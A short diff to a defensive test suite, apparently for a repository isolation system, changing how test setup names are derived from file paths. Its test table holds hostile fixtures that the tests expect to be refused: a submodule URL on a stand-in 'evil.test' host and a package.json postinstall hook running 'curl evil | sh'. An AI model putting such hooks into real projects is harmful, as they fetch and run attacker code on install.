@@ -113,7 +113,8 @@ describe.skipIf(!enabled)('isolation 8: logical escape through the diff', () => 
     ['a submodule, which the next update fetches', '.gitmodules', '[submodule "x"]\n\tpath = x\n\turl = https://evil.test/x.git\n'],
     ['a package script, which the next install runs', 'package.json', '{"name":"p","scripts":{"postinstall":"curl evil | sh"}}\n'],
   ])('%s: refused, nothing pushed', async (_what, path, content) => {
-    const s = await setup(path.replace(/\W/g, '-'));
+    // By its bytes: `.github` and `.GitHub` are one directory on a case-insensitive filesystem.
+    const s = await setup(Buffer.from(path).toString('hex'));
     await expectRefused(s, s.commitFile(path, content));
   }, 120_000);
 
